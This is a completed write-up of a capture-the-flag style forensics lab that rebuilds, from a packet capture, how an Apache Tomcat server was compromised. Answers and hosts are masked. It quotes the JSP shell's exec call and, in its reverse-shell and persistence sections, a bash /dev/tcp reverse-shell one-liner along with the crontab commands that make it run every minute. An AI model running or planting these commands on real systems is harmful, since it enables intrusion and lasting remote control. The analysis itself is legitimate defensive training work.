# English Write-up — Tomcat Takeover Lab

Status: completed

## 1. Context

This write-up documents the analysis of a PCAP file related to an Apache Tomcat compromise.

The objective is to reconstruct the attack chain from network evidence:

1. identify the attacker
2. identify the exposed service
3. identify directory enumeration
4. identify access to the admin panel
5. identify valid credentials
6. identify the uploaded WAR file
7. identify reverse shell execution
8. identify persistence

## 2. Attacker identification

The HTTP traffic shows two main clients:

- `**********`, which appears to be regular browsing activity;
- `**********`, which performs suspicious activity.

The IP address `**********` is responsible for enumeration, Tomcat Manager access attempts, WAR upload, and the reverse shell activity.

Answer Q1:

```text
********
```

## 3. Exposed service

The HTTP requests target `**********` on port `****`.

This port corresponds to the exposed Tomcat web service.

Answer Q3:

```text
********
```

## 4. Web enumeration

The following User-Agent appears in the HTTP requests:

```text
************
```

This indicates that Gobuster was used to discover web directories and files.

Examples of tested paths:

```text
/admin
/admin-console
/host-manager
/*******
/*******/html
/*******/list
/status
/webdav
```

Answer Q4:

```text
********
```

## 5. Admin panel discovery

Multiple requests to `/*******`, `/*******/html`, and other Tomcat Manager-related paths show that the attacker attempted to identify administrative interfaces.

The main directory discovered is:

```text
/*******
```

Answer Q5:

```text
********
```

## 6. Credential brute-force or testing

HTTP Basic Authentication headers reveal several tested credential pairs:

```text
*****:*****
******:******
admin:
*****:******
******:******
*****:******
```

The credential pair that leads to successful access and WAR upload is:

```text
*****:******
```

Answer Q6:

```text
********
```

## 7. WAR upload

The attacker sends a POST request to:

```text
/*******/html/upload
```

The multipart content reveals the uploaded filename:

```text
filename="******.***"
```

Answer Q7:

```text
********
```

## 8. WAR extraction and analysis

The extracted WAR contains:

```text
WEB-INF/
WEB-INF/web.xml
********.***
```

The `web.xml` file indicates that the JSP is configured as the welcome file:

```xml
<welcome-file>********.***</welcome-file>
```

The JSP contains Java code used to execute a system shell:

```java
Process process = Runtime.getRuntime().exec(ShellPath);
```

It also attempts to establish an outbound network connection.

## 9. Webshell trigger

After the upload, the attacker accesses:

```text
/******/
```

This triggers the malicious JSP contained in the deployed WAR file.

## 10. Reverse shell

TCP stream `****` shows an interactive connection between:

```text
**********:***** -> **********:80
```

The ASCII stream reveals the executed commands:

```bash
whoami
cd /tmp
pwd
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
crontab -i cron
crontab -l
```

The `whoami` command returns:

```text
****
```

## 11. Persistence

The attacker installs a cron job scheduled to run every minute:

```cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
```

This persistence mechanism re-establishes a reverse shell to `**********` on port `***`.

Answer Q8:

```text
********
```

## 12. Timeline

| Relative time | Event |
|---:|---|
| `386s` | Large Gobuster enumeration |
| `409s` | Access to `/*******/html` |
| `418s - 437s` | Basic Auth attempts |
| `437s` | Successful authentication with `*****:******` |
| `547s` | Upload of `******.***` |
| `556s` | Access to `/******/` |
| `563s+` | Active reverse shell |
| `669s` | Cron persistence installed |

## 13. IOCs

```text
**********
**********
****
80
443
/*******
/*******/html
/*******/html/upload
/******/
******.***
********.***
************
*****:******
tcp.stream == ****
```

## 14. Conclusion

The analysis confirms a full Tomcat compromise.

The attacker `**********` discovered `/*******`, validated the credentials `*****:******`, uploaded `******.***`, triggered the JSP `********.***`, obtained a reverse shell with `****` privileges, and installed cron-based persistence to `**********:443`.
